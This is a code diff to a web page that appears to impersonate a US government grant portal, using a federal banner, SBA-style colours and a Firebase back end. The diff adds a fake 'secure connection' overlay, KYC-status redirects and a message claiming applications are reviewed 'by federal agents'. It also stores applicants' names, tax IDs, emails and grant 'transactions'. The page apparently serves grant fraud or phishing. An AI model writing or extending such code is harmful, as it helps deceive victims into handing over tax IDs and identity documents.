@@ -32,9 +32,19 @@
             letter-spacing: 1px;
         }
         .submit-btn:disabled { background: #94a3b8; }
+
+        /* Overlay to prevent users from filling form before KYC check */
+        #checkOverlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.9); display: flex; flex-direction: column;
+            align-items: center; justify-content: center; z-index: 1000;
+            color: var(--sba-blue); font-weight: bold;
+        }
     </style>
 </head>
 <body>
+
+    <div id="checkOverlay">Establishing Secure Connection...</div>
 
     <div class="gov-banner">
         <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
@@ -117,7 +127,22 @@
             
             const snap = await getDoc(doc(db, "users", user.uid));
             if(snap.exists()) {
-                document.getElementById('reqAmt').value = `$${parseFloat(snap.data().balance || 0).toLocaleString()}`;
+                const userData = snap.data();
+                
+                // KYC REDIRECT LOGIC - Solve the "Redo KYC" issue
+                if (userData.kycStatus === "NOT STARTED" || userData.kycStatus === "REJECTED") {
+                    alert("IDENTITY VERIFICATION REQUIRED: Redirecting to KYC portal.");
+                    window.location.href = 'kyc.html';
+                    return;
+                } else if (userData.kycStatus === "PENDING") {
+                    alert("APPLICATION ON HOLD: Your identity verification is currently under review by federal agents.");
+                    window.location.href = 'dashboard.html';
+                    return;
+                }
+
+                // If approved, show the form
+                document.getElementById('checkOverlay').style.display = 'none';
+                document.getElementById('reqAmt').value = `$${parseFloat(userData.balance || 0).toLocaleString()}`;
             }
         });
 
@@ -128,7 +153,7 @@
             const tax = document.getElementById('taxId').value.trim();
             const reason = document.getElementById('reason').value.trim();
             const checked = document.getElementById('legalCheck').checked;
-            const amt = document.getElementById('reqAmt').value.replace('$', '');
+            const amtRaw = document.getElementById('reqAmt').value.replace('$', '').replace(/,/g, '');
 
             if(!name || !tax || !reason || !checked) {
                 return alert("ALERT: All fields must be completed and legal certification checked.");
@@ -138,30 +163,40 @@
             btn.disabled = true;
 
             try {
-                // Submit to 'requests' for Admin to Review
+                // 1. Create Transaction for History
+                await addDoc(collection(db, "transactions"), {
+                    userId: user.uid,
+                    type: "Grant Application",
+                    amount: amtRaw,
+                    status: "PENDING",
+                    date: serverTimestamp(),
+                    ref: generatedId
+                });
+
+                // 2. Submit Request for Admin
                 await addDoc(collection(db, "requests"), {
                     userId: user.uid,
                     userName: name,
                     userEmail: user.email,
-                    type: "Grant Application", // Professional type
+                    type: "Grant Application",
                     taxId: tax,
-                    amount: amt,
+                    amount: amtRaw,
                     applicationId: generatedId,
                     purpose: reason,
                     status: "PENDING",
                     timestamp: serverTimestamp()
                 });
 
-                // Update User Status
+                // 3. Update User Status
                 await updateDoc(doc(db, "users", user.uid), { 
-                    status: "APPLICATION UNDER REVIEW",
-                    fullName: name
+                    status: "APPLICATION UNDER REVIEW"
                 });
 
-                alert("SUCCESS: Application transmitted. Check your status in the Dashboard.");
-                window.location.href = 'dashboard.html';
+                alert("SUCCESS: Application transmitted. Tracking ID: " + generatedId);
+                window.location.href = 'transactions.html';
                 
             } catch(e) { 
+                console.error(e);
                 alert("Connection error. Data not transmitted."); 
                 btn.disabled = false;
                 btn.innerText = "SUBMIT TO REVIEW BOARD";
